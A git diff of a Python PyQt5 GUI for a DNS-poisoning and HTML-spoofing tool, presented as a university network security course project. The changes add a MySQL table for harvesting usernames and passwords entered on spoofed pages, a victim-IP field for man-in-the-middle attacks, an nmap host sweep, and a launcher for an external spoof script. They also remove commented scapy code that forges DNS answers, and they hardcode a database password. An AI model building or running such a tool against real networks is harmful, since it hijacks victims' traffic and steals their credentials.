@@ -4,10 +4,11 @@ import subprocess
 import re
 from datetime import datetime
 import shutil
-from threading import Thread
+import threading
 from queue import Queue
 from socket import gethostbyname, getaddrinfo, AF_INET6
 from scapy.all import *
+import mysql.connector
 #from tkinter import filedialog
 from PyQt5.QtCore import *
 from PyQt5.QtGui import *
@@ -15,7 +16,8 @@ from PyQt5.QtWidgets import *
 
 class dns_window(QMainWindow):
 
-    #Constructorr
+    #Constructor
+    stop_t = False
     def __init__(self):
         super().__init__()
         self.htmloption = False
@@ -24,8 +26,10 @@ class dns_window(QMainWindow):
         self.q= Queue()
         self.t1 = ""
         self.interface = ""
+        self.net = []
         self.Version = "Ubuntu"
         self.hostdict = []
+        self.htmloption = True
         self.setWindowTitle(title)
         self.setGeometry(0,0,500,300) #Set window size
         self.center()
@@ -35,6 +39,7 @@ class dns_window(QMainWindow):
         self.labels()
         self.buttons()
         self.entryBox()
+        self.victimEntryBox()
         self.show()
     def center(self):
         qr = self.frameGeometry() #Get information about the location and size of the window
@@ -50,6 +55,7 @@ class dns_window(QMainWindow):
         filemenu = QMenu("&File",self)
         program = QMenu("&Program",self)
         view = QMenu("&View",self)
+        mysqldb = QMenu('&Mysql',self)
         helps = QMenu("&Help",self)
         #Add actions to menu entities
         program.addAction(self.versionaction)
@@ -59,12 +65,16 @@ class dns_window(QMainWindow):
         filemenu.addAction(self.uploadaction)
         view.addAction(self.logaction)
         view.addAction(self.sqlaction)
+        mysqldb.addAction(self.sqlcredsaction)
+        mysqldb.addAction(self.sqlsetupaction)
+        mysqldb.addAction(self.sqlresetaction)
         helps.addAction(self.helpaction)
         helps.addAction(self.aboutaction)
         #Add menu entities to menu object
         mbar.addMenu(program)
         mbar.addMenu(filemenu)
         mbar.addMenu(view)
+        mbar.addMenu(mysqldb)
         mbar.addMenu(helps)
     def baraction(self):
         #Create action options under the menu entities
@@ -74,7 +84,10 @@ class dns_window(QMainWindow):
         self.versionaction = QAction("&OS Version",self)
         self.uploadaction = QAction("&Upload HTML",self)
         self.logaction = QAction("&View Log",self)
-        self.sqlaction = QAction("&View MySql",self)
+        self.sqlaction = QAction("&View MySql Results",self)
+        self.sqlcredsaction = QAction("&Provide DB Info",self)
+        self.sqlsetupaction = QAction("&Setup Spoof DB",self)
+        self.sqlresetaction = QAction("&Reset Cred. Table",self)
         self.helpaction = QAction("&Help",self)
         self.aboutaction = QAction("&About",self)
     def connectbar(self):
@@ -86,6 +99,9 @@ class dns_window(QMainWindow):
         self.uploadaction.triggered.connect(self.upload)
         self.logaction.triggered.connect(self.viewlog)
         self.sqlaction.triggered.connect(self.viewsql)
+        self.sqlcredsaction.triggered.connect(self.credsql)
+        self.sqlsetupaction.triggered.connect(self.setupsql)
+        self.sqlresetaction.triggered.connect(self.resetsql)
         self.helpaction.triggered.connect(self.help)
         self.aboutaction.triggered.connect(self.about)
     def start(self):
@@ -123,19 +139,62 @@ class dns_window(QMainWindow):
         if len(filename) > 0:
             shutil.copy(filename,f"{htmldir}/HTMLSpoofs") #Copy HTML/php file to HTMLSpoofs directory
     def viewlog(self):
-        hold
+        pass
+
     def viewsql(self):
-        hold
+        result = self.mysqltable("V")
+        if result == 1:
+            resultBox = QMessageBox(self)
+            resultBox.setWindowTitle("Results pulled successfully")
+            resultBox.setText("Credentials have been pulled. Open Credentials.txt to view results")
+            resultBox.exec()
+        else:
+            resultBox = QMessageBox(self)
+            resultBox.setIcon(QMessageBox)
+            resultBox.setWindowTitle("Results failed")
+            resultBox.setText("Error occurred when pulling results, try again")
+            resultBox.exec()
+
+    def credsql(self):
+        pass
+    def setupsql(self):
+        result = self.mysqltable("S")
+        if result == 1:
+            resultBox = QMessageBox(self)
+            resultBox.setWindowTitle("DB setup successful")
+            resultBox.setText("DB has been setup for storing info from spoofed HTML pages")
+            resultBox.exec()
+        else:
+            resultBox = QMessageBox(self)
+            resultBox.setIcon(QMessageBox)
+            resultBox.setWindowTitle("Setup failed")
+            resultBox.setText("Error occurred when setting up DB, try again")
+            resultBox.exec()
+
+    def resetsql(self):
+        result = self.mysqltable("R")
+        if result == 1:
+            resultBox = QMessageBox(self)
+            resultBox.setWindowTitle("Spoof DB reset successfully")
+            resultBox.setText("Spoof DB's credentials table has been successfully reset")
+            resultBox.exec()
+        else:
+            resultBox = QMessageBox(self)
+            resultBox.setIcon(QMessageBox)
+            resultBox.setWindowTitle("Reset failed")
+            resultBox.setText("Error occurred when resetting Spoof DB, try again")
+            resultBox.exec()
+
     def help(self):
         helpbox = QMessageBox(self)
         helpbox.setWindowTitle("Help")
-        helptext = "Default OS: Ubuntu\nTo run click start, to stop click stop\nTo add domains to poison change the domains.txt file\nTo add domains that redirect to a spoofed HTML change the domainsSpoof.txt file\nThis program must be run with root privileges to function properly"
+        helptext = "Default OS: Ubuntu\n\nRequirements:\nBefore running the GUI run the install.py file using sudo python3 install.py or sudo python install.py This file is required to downloads all dependencies needed for the GUI\n\nSetup for HTTP Spoof:\nGo to Mysql tab in menu to setup/reset Mysql DB and credentials table\nAll spoofed HTML/PHP files and dependencies should be stored in /var/www/<spoof domain> folder\nSet sql DB info/credentials in SqlCredentials.txt and set the victim IP for the MITM in victimIP.txt (only 1 IP)\nInstructions:\nTo run click start, to stop click stop\nTo add domains to poison change the domains.txt file\nTo add domains that redirect to a spoofed HTML change the domainsSpoof.txt file\nMysql credentials table results can be viewed in View menu\n\nThis program must be run with root privileges to function properly"
         helpbox.setText(helptext)
         helpbox.exec()
     def about(self):
         aboutbox = QMessageBox(self)
         aboutbox.setWindowTitle("About")
-        abouttext = "A VCU projec\nCMSC414 Computer & Network Security"
+        abouttext = "A VCU project\nCMSC414 Computer & Network Security\nCreators:\n\nChristian Jones, G Attard"
         aboutbox.setText(abouttext)
         aboutbox.exec()
 
@@ -203,64 +262,45 @@ class dns_window(QMainWindow):
             print("An error occurred, retry or check your network config")
 
     def netretrieveLinux(self):
-        try: 
+        hostname = subprocess.run(['hostname','-I'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+        hostname = hostname.split(" ")
 
-            hostname = subprocess.run(['hostname','-I'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-            hostname = hostname.split(" ")
+        ifconfig_lines = subprocess.run(['ifconfig','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
+        ifconfig_lines = [line.strip() for line in ifconfig_lines if 1==1]
 
-            ifconfig_lines = subprocess.run(['ifconfig','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
-            ifconfig_lines = [line.strip() for line in ifconfig_lines if 1==1]
+        found = 0
+        iface = ""
+        x = 0
+        y = 0
+        while found == 0:
+            check = ifconfig_lines[x]
+            check = check.split(" ")
+            aface = re.search("^[a-zA-Z0-9_.-]*:$",check[0])
+            if check[0] != "":
+                if aface:
+                    iface = check[0].replace(":","")
+                    y = x
 
+                if(check[1] == hostname[0]):
+                    found = 1
+            x = x + 1
 
-            found = 0
-            iface = ""
-            x = 0
-            y = 0
-            while found == 0:
-                check = ifconfig_lines[x]
-                check = check.split(" ")
-                aface = re.search("^[a-zA-Z0-9_.-]*:$",check[0])
-                if check[0] != "":
-                    if aface:
-                        iface = check[0].replace(":","")
-                        y = x
+        subnet = hostname[0][0:9]
+        subnetScan = f"{subnet}.0/24"
+        scan = subprocess.run(['sudo','nmap','-sn',f'{subnetScan}'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+        scan = scan.split('\n')
 
-                    if(check[1] == hostname[0]):
-                        found = 1
-                x = x + 1
-
-            done = 0
-            MAC = ""
-            foundit = 0
-            while done == 0:
-                check = ifconfig_lines[y]
-                check = check.split(" ")
-                if(check[0] == 'ether' and foundit == 0):
-                    MAC = check[1]
-                    done = 1
-                y = y+1
-                if(ifconfig_lines[x] == ""):
-                    done = 1
-
-            arptable = subprocess.run(['arp','-a'], stdout=subprocess.PIPE).stdout.decode('utf-8').splitlines()
-
-            arpdone = 0
-            x = 0
-            IPs_MAC = []
-            tempARP = []
-            paren_remove = ["(",")"]
-            for x in range(len(arptable)):
-                checkarp = arptable[x].split(" ")
-                if(re.match(iface,checkarp[6])):
-                    for paren in paren_remove:
-                        checkarp[1] = checkarp[1].replace(paren,"")
-                    IPs_MAC.append(checkarp[1]); IPs_MAC.append(checkarp[3])
-            
-            IPs_MAC.append(hostname[0]); IPs_MAC.append(MAC); IPs_MAC.append(iface)
-            return IPs_MAC
-
-        except:
-            print("An error occurred, retry or check your network config")
+        IPs_MAC = []
+        for x in range(1,len(scan)):
+            ip = re.findall('[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+',scan[x])
+            if len(ip) == 1:
+                IPs_MAC.append(ip[0][0:])
+            mac = re.findall('[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+\:[a-zA-Z0-9]+',scan[x])
+            if len(mac) == 1:
+                IPs_MAC.append(mac[0][0:])
+        
+        IPs_MAC.append(hostname[0]); IPs_MAC.append(hostname[1]); IPs_MAC.append(iface)
+        return IPs_MAC
 
     def IPsMAC(self):
         if self.Version == "Ubuntu":
@@ -276,20 +316,117 @@ class dns_window(QMainWindow):
                 IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                 self.lists.addItem(IP)
             self.interface = IpsMACs[(len(IpsMACs)-1)]
-            print(self.interface)
         elif self.Version == "Windows":
             IpsMACs = self.netretrieveWindows()
             HostIP_MAC = []
             HostIP_MAC.append(IpsMACs[len(IpsMACs)-3]); HostIP_MAC.append(IpsMACs[len(IpsMACs)-2]); 
             self.hostLabel.setText(f"Host IP: {HostIP_MAC[0]}\nHost MAC: {HostIP_MAC[1]}")
             self.hostLabel.setAlignment(Qt.AlignLeft)
-            self.hostLabel.resize(200,30)
+            self.hostLabel.resize(200,50)
             self.hostLabel.move(10,30)
             self.lists.clear()
             for x in range(0, len(IpsMACs)-3, 2):
                 IP = QListWidgetItem(f"IP: {IpsMACs[x]} MAC: {IpsMACs[x+1]}")
                 self.lists.addItem(IP)
             self.interface = IpsMACs[(len(IpsMACs)-1)]
+            self.net = IpsMACs
+    
+    #Mysql
+    def mysqltable(self, todo):
+        if todo == "S":
+            mydb = ""
+            try:
+                mydb = mysql.connector.connect(
+                    host="127.0.0.1",
+                    user="debian-sys-maint",
+                    password="5EB0SFQgoKH3KZ8p",
+                )
+            except mysql.connector.Error as err:
+                print("Mysql Connection error {}".format(err))
+
+
+            mycursor = mydb.cursor()
+            try:
+                mycursor.execute("CREATE DATABASE spoof")
+                mycursor.close()
+                mydb.close()
+            except: 
+                print("Spoof database already exist")
+            
+            try: 
+                mydb = mysql.connector.connect(
+                    host="127.0.0.1",
+                    user="debian-sys-maint",
+                    password="5EB0SFQgoKH3KZ8p",
+                    database="spoof"
+                )
+            except mysql.connector.Error as err:
+                print("Mysql Connection error {}".format(err))
+                return 0
+
+            mycursor = mydb.cursor()
+            try:
+                mycursor.execute("CREATE TABLE credentials (id INT AUTO_INCREMENT, username varchar(200), password varchar(200), PRIMARY KEY(id))")
+                mycursor.close()
+                mydb.close()
+                return 1
+            except:
+                print("credentials table already exist")
+                return 1
+
+        elif todo == "V":
+            mydb = ""
+            try: 
+                mydb = mysql.connector.connect(
+                    host="127.0.0.1",
+                    user="debian-sys-maint",
+                    password="5EB0SFQgoKH3KZ8p",
+                    database="spoof"
+                )
+            except mysql.connector.Error as err:
+                print("Mysql Connection error {}".format(err))
+                return 0
+
+            mycursor = mydb.cursor()
+            try:
+                mycursor.execute("SELECT * FROM credentials")
+                result = mycursor.fetchall()
+                credFile = open('../Credentials.txt','w')
+                credFile.write("ID  |  USER  |  PASS\n____________________\n")
+                print("\nID  |  USER  |  PASS")
+                print("____________________")
+                for x in result:
+                    print(f"{x[0]}     {x[1]}   {x[2]}")
+                    credFile.write(f"{x[0]}     {x[1]}   {x[2]}\n")
+                print("\n")
+                credFile.close()
+                mycursor.close()
+                return 1
+            except: 
+                print("Something went wrong with the credentials table")
+                return 0
+
+        elif todo == "R":
+            mydb = ""
+            try: 
+                mydb = mysql.connector.connect(
+                    host="127.0.0.1",
+                    user="debian-sys-maint",
+                    password="5EB0SFQgoKH3KZ8p",
+                    database="spoof"
+                )
+            except mysql.connector.Error as err:
+                print("Mysql Connection error {}".format(err))
+                return 0
+
+            mycursor = mydb.cursor()
+            try:
+                mycursor.execute("TRUNCATE TABLE credentials")
+                mycursor.close()
+                return 1
+            except:
+                print("Something went wrong when deleting the table")
+                return 0
 
     #Labels,Buttons&TextBox
     def labels(self):
@@ -303,7 +440,7 @@ class dns_window(QMainWindow):
         self.domainLabel = QLabel("Domains to Poison",self)
         self.domainLabel.setAlignment(Qt.AlignCenter)
         self.domainLabel.move(320,70)
-        self.domainLabel.resize(110,40)
+        self.domainLabel.resize(125,40)
         self.domainLabel2 = QLabel("HTML to Spoof",self)
         self.domainLabel2.setAlignment(Qt.AlignCenter)
         self.domainLabel2.move(320,190)
@@ -322,7 +459,7 @@ class dns_window(QMainWindow):
 
         self.dropdown = QComboBox(self) #Dropdown box button
         self.dropdown.addItem("All Domains")
-        domains = open('domains.txt','r')
+        domains = open('../domains.txt','r')
         urls = domains.readlines()
         d = 0
         for url in urls:
@@ -341,8 +478,8 @@ class dns_window(QMainWindow):
         self.dontSpoof.move(320,160)
 
         self.dropdown2 = QComboBox(self)
-        self.dropdown2.addItem("All Domains")
-        domainSpoof = open('domainSpoof.txt','r')
+        self.dropdown2.addItem("None")
+        domainSpoof = open('../domainSpoof.txt','r')
         urlSpoof = domainSpoof.readlines()
         for url in urlSpoof:
             self.dropdown2.addItem(url.strip())
@@ -352,56 +489,42 @@ class dns_window(QMainWindow):
         self.entryLabel = QLabel("Where to redirect",self)
         self.entryLabel.setAlignment(Qt.AlignCenter)
         self.entryLabel.move(320,35)
+        self.entryLabel.resize(120,30)
         self.entry = QLineEdit(self)
         self.entry.move(320,60)
         self.entry.resize(100,20)
     
-    #Spoof/Poison Functions, seperate file with this code used instead of this function
-    #def dnsSpoof(self,pkt):
-        #try:
-            #if self.q.get() != "stop":
-            #for key in self.hostdict:#For loop to check each name in hostDict
-                #if (DNS in pkt and key in pkt[DNS].qd.qname): #Check if qname in packet matches any domain name in the hostDict
-                    #print(f'packet found {key}')
-                    #if IP in pkt:
-                        #print(pkt[IP].src)
-                        #print(pkt[IP].dst)
-                        #IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst) #Switch source to be destination packet payload is sent back to the victim
-                        #UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-                        #Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='A',ttl=259200,rdata=f'{self.ip}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-                        #NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ip}')
-                        #DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
-                        #spoofpkt = IPpkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-                        #sendp(spoofpkt,iface=f"{self.interface}") #Send spoofed packet to the the victim
-                    #elif IPv6 in pkt:
-                        #IPv6pkt = IPv6(dst=pkt[IPv6].src,src=pkt[IPv6].dst) #Switch source to be destination packet payload is sent back to the victim
-                        #UDPpkt = UDP(dport=pkt[UDP].sport,sport=53) #Using UDP port 53 (DNS)
-                        #Anssec = DNSRR(rrname=pkt[DNS].qd.qname,type='AAAA',ttl=259200,rdata=f'{self.ipv6}') #Set the Answer nd NSsec record rdata to the new IP to redirect the victim
-                        #NSsec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS',ttl=259200,rdata=f'{self.ipv6}')
-                        #DNSpkt = DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,rd=0,qdcount=1,qr=1,ancount=1,nscount=1,an=Anssec,ns=NSsec)#Set qr to 1 to represent a response packet
-                        #spoofpkt = IPv6pkt/UDPpkt/DNSpkt #Store modified variables into spoofpkt
-                        #sendp(spoofpkt,iface=self.interface) #Send spoofed packet to the the victim
-        #except:
-            #return ""
+    def victimEntryBox(self):
+        self.victimLabel = QLabel("Victim IP for MITM",self)
+        self.victimLabel.setAlignment(Qt.AlignCenter)
+        self.victimLabel.move(320,245)
+        self.victimLabel.resize(125,30)
+        self.entryv = QLineEdit(self)
+        self.entryv.move(320,270)
+        self.entryv.resize(100,20)
 
     def set_spoof(self,radio):
         if radio.text() == "Spoof HTML":
             if radio.isChecked() == True:
-                htmloption = True
+                self.htmloption = True
             else:
-                htmloption = False
+                self.htmloption = False
 
-    def poison(self):
+    def poison(self,ip,ipv6,spoof):
         system('sudo resolvectl flush-caches')
-        system('sudo python3 ../DNS_SPOOF/DNS_SPOOF_copy.py')
-        #pkt=sniff(filter='udp and dst port 53', prn=self.dnsSpoof)
-        #print(pkt.summary())
+        print("Running DNS Spoof")
+        system(f'sudo python3 ../DNS_SPOOF/DNS_SPOOF2.py {ip} {spoof}')
         self.Stop()
 
     def Start(self):
         failed = 0 #Fail Check
         if self.running == False:
             self.running = True
+            startbox = QMessageBox(self)
+            startbox.setWindowTitle("Start Spoof")
+            starttext = "GUI will freeze while running attack do not force close.\nInstead, close spoof attack runnning in terminal with ctrl+c before continuing"
+            startbox.setText(starttext)
+            startbox.exec()
             if self.Version == "Ubuntu":
                 if(self.interface == ""):
                     getface = self.netretrieveLinux()
@@ -415,18 +538,20 @@ class dns_window(QMainWindow):
                 system('ipconfig /flushdns')
             if self.entry.text() != "": 
                 redirect = self.entry.text()
+                
                 try:
                     self.ip = gethostbyname(redirect)
-                    self.ipv6 = ""
-                    print(self.ip)
+                    self.ipv6 = "0"
                 except:
                     failed =  failed + 1
                     pass
                 try:
+
                     self.ipv6 = getaddrinfo(redirect,None,AF_INET6)[0][4][0]
                 except:
                     failed = failed + 1
                     pass
+
                 if failed == 2:
                     warnBox = QMessageBox(self)
                     warnBox.setIcon(QMessageBox.Warning)
@@ -435,9 +560,14 @@ class dns_window(QMainWindow):
                     warnBox.exec()
                     self.Stop()
                 else:
+                    spoofUrl = ""
+                    if self.htmloption == True:
+                        spoofUrl = self.dropdown2.currentText()
+                    else:
+                        spoofUrl = "None"
                     time = datetime.now()
                     self.lists2.addItem(f"Poisoning has begun {time}")
-                    self.poison()
+                    self.poison(self.ip,self.ipv6,spoofUrl)
                     #self.q.put("run")
                     #self.t1 = Thread(target=self.poison, daemon= True)
                     #self.t1.start()
@@ -452,6 +582,7 @@ class dns_window(QMainWindow):
     def Stop(self):
         if self.running == True:
             self.running = False
+            stop_t = True
             time = datetime.now()
             self.lists2.addItem(f"Poisoning has ended {time}")
         if self.t1 != "":
